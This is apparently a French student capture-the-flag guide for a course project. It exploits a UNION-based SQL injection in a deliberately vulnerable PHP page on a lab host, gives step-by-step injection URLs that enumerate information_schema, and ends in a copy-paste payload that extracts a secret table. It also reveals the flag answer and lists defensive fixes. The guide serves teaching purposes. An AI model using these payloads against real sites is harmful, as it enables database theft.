===============================================
   GUIDE D'EXPLOITATION - SQL INJECTION UNION
   SAE Cybersécurité - Alois
===============================================

OBJECTIF : Récupérer le FLAG dans la table secrète 
"Codes_Maintenance_Secrets" via injection SQL UNION

FLAG : FLAG{SQL_UNI0N_M4ST3R_2024}

===============================================
1. SETUP - EXÉCUTER LE SQL
===============================================

D'abord, exécuter le fichier SQL_Injection_Setup.sql :

mysql -u root -p AutoMarket < SQL_Injection_Setup.sql

Ou via phpMyAdmin, copier-coller le contenu du fichier.

===============================================
2. PRINCIPE DE L'ATTAQUE
===============================================

La page "Entretiens" a 3 filtres :
- type (ID du type de véhicule) → VULNÉRABLE
- marque → Protégé avec quote()
- entretien → Protégé avec quote()

Le paramètre "type" est concaténé directement dans la requête :
$sql .= " AND e.id_type = " . $type_filter;

On peut injecter du SQL après le numéro.

===============================================
3. ÉTAPES D'EXPLOITATION
===============================================

ÉTAPE 1 : Vérifier la vulnérabilité
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=1 OR 1=1

→ Retourne TOUS les résultats (OR 1=1 est toujours vrai)

ÉTAPE 2 : Trouver le nombre de colonnes
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=1 ORDER BY 7--
→ OK (7 colonnes)

http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=1 ORDER BY 8--
→ Erreur (trop de colonnes)

ÉTAPE 3 : Identifier les colonnes affichées avec UNION
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=-1 UNION SELECT 1,2,3,4,5,6,7--

→ On voit quelles colonnes sont affichées (1,2,3,4,5,6,7)

ÉTAPE 4 : Lister les tables de la base
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=-1 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()--

→ On découvre la table "Codes_Maintenance_Secrets"

ÉTAPE 5 : Lister les colonnes de la table secrète
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=-1 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='Codes_Maintenance_Secrets'--

→ On voit : id_code, code_vehicule, code_secret, niveau_acces

ÉTAPE 6 : Extraire le FLAG !
http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=-1 UNION SELECT 1,code_vehicule,niveau_acces,code_secret,5,6,7 FROM Codes_Maintenance_Secrets--

→ FLAG{SQL_UNI0N_M4ST3R_2024} apparaît dans la colonne description !

===============================================
4. PAYLOAD FINAL (copier-coller)
===============================================

http://192.168.49.24/sae-cyber/index.php?page=entretiens&type=-1 UNION SELECT 1,code_vehicule,niveau_acces,code_secret,5,6,7 FROM Codes_Maintenance_Secrets--

===============================================
5. MESURES DE PROTECTION
===============================================

1. Utiliser des requêtes préparées (prepared statements)
2. Valider que le paramètre est bien un entier : intval($type)
3. Utiliser une whitelist de valeurs autorisées
4. Échapper les entrées avec quote() ou htmlspecialchars()
5. Principe du moindre privilège pour l'utilisateur MySQL
